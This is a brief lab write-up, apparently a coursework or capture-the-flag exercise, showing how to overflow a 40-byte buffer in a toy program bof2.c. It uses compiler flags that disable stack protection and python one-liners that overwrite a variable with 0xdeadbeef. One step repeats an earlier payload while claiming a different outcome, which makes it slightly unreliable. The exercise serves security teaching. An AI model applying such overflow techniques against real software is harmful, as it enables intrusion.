# Understand bof2.c 
In this attack, we will try to replace the return address with another function's return address (redirect control) by using python!
## Stackframe

## Vulnerability
In the program, we see fgets(buf, 45, stdin), but buf only has 40 bytes, which leads to a buffer overflow.
# Start attacking bof2.c 
## Compiling the file without stack restriction
`gcc -g bof2.c -o bof2.out -fno-stack-protector -mpreferred-stack-boundary=2`  
## Start inputing files with 0x4030201
`echo $(python -c "print('a'*40+'\x01\x02\x03\x04')") | ./bof2.out 123`  
We see that there is no message because the if clause is not touched!
## Try with other address: \xff\xff\xff\xff
`echo $(python -c "print('a'*40+'\x01\x02\x03\x04')") | ./bof2.out 123`  
Now we see a message that "You are on the right way!"
## Now we input 0xdeadbeef to see the message from the second if!
`echo $(python -c "print('a'*40+'\xef\xbe\xad\xde')") | ./bof2.out 123`
Now you see that the message is "Yeah! You win!"
